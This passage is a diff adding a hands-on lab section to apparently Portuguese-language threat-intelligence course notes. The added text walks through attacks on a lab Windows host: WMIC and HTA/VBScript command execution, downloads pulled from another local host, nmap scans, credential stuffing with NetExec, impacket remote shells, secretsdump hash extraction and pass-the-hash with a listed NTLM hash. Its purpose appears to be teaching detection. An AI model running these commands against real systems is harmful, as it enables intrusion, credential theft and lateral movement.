@@ -21,11 +21,171 @@ Passos:
 3. Filtrar por processos com argumentos suspeitos.
 4. Criar regra Sigma para detectar padrões
 
+
+
 Prática
+Execução de wmi - Comando executado, mas sem retorno
+```
+wmic process call create "cmd /c whoami"
+```
+Validação da execução
+```
+wmic process call create "cmd /c whoami > C:\Users\admin\whoami.txt"
+```
+Verificando se o arquivo foi salvo
+```
+dir
+```
+Lendo o arquivo criado
+```
+type whoami.txt
+```
+Baixando um arquivo com wmi
+```
+wmic process call create "powershell iwr -uri 'http://192.168.2.118:8080/data.txt' -o C:\Users\admin\data.txt"
+```
+Executando comando com MSHTA
+```
+<html>
+<head>
+<title>Command whoami</title>
+<HTA:APPLICATION ID="app"/>
+</head>
+<body>
+<script language="VBScript">
+    Dim shell, retorno
+    Set shell = CreateObject("WScript.Shell")
+    retorno = shell.Exec("cmd /c whoami").StdOut.ReadAll
+    MsgBox "Resultado do whoami: " & retorno
+</script>
+</body>
+</html>
+```
+Baixando arquivo com MSHTA
+```
+<html>
+<head>
+<title>Download data</title>
+<HTA:APPLICATION ID="app"/>
+</head>
+<body>
+<script language="VBScript">
+    Dim shell, retorno
+    Set shell = CreateObject("WScript.Shell")
+    retorno = shell.Exec("powershell iwr -uri 'http://192.168.2.118:8080/data.txt' -o C:\Users\admin\desktop\data.txt").StdOut.ReadAll
+</script>
+</body>
+</html>
+```
+
 Kali Linux
+Verificando portas abertas
+```
+nmap 192.168.2.126
+```
+- Resultado
+```
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+5357/tcp open  wsdapi
+5985/tcp open  wsman
+8000/tcp open  http-alt
+8443/tcp open  https-alt
+9000/tcp open  cslistener
+``` 
+Verificando serviços e versões nas ports abertas
+```
+nmap -sV 192.168.2.126 -p21,22,80,135,139,445,5357,5985,8000,8443,9000
+```
+- Resultado
+```
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
+80/tcp   open  http          Microsoft IIS httpd 10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8000/tcp open  http-alt      BarracudaServer.com (Windows)
+8443/tcp open  ssl/https-alt BarracudaServer.com (Windows)
+9000/tcp open  http          BadBlue httpd 2.7
+```
+Enumerando informações do alvo com NetExec
+SMB
+```
+$ nxc smb 192.168.2.126
+```
+- Resultado
+```
+SMB 192.168.2.126 445 DESKTOP-7E8SQOV [*] Windows 10 / Server 2019 Build 19041 x64 (name:DESKTOP-7E8SQOV) (domain:DESKTOP-7E8SQOV) (signing:False) (SMBv1:None)
+```
+Credential Stuffing (smith:smith)
+- FTP
+```
+nxc ftp 192.168.2.126 -u smith -p smith
+```
+- SSH
+```
+nxc ssh 192.168.2.126 -u smith -p smith
+```
+- FTP
+```
+nxc ftp 192.168.2.126 -u smith -p smith
+```
+- SMB
+```
+nxc smb 192.168.2.126 -u smith -p smith
+```
+- WINRM
+```
+nxc winrm 192.168.2.126 -u smith -p smith
+```
+Acesso externo com PSExec
+```
+impacket-psexec smith:smith@192.168.2.126
+```
+Acesso externo com WMIExec
+```
+impacket-wmiexec smith:smith@192.168.2.126
+```
+Acesso externo com Evil-WinRM
+```
+evil-winrm -i 192.168.2.126 -u smith -p smith
+```
+Extraindo hashes com secretsdump
+```
+impacket-secretsdump smith:smith@192.168.2.126
+```
+Pass The Hash com usuário smith
+- PSExec
+```
+impacket-psexec smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404ee:48ff5741a4f96d75a9dc23432a6c2fb6
+```
+- WMIExec
+```
+impacket-wmiexec smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404ee:48ff5741a4f96d75a9dc23432a6c2fb6
+```
+- WinRM
+```
+evil-winrm -i 192.168.2.126 -u smith -H 48ff5741a4f96d75a9dc23432a6c2fb6
+```
+- Extraindo hashes com secretsdump
+```
+impacket-secretsdump smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404ee:48ff5741a4f96d75a9dc23432a6c2fb6
+```
+
+Baixando Script que encoda o comando em base64
 ```
 https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/encode-command.py
 ```
+
 
 Editando o script de acordo com o nosso comando:
 ```
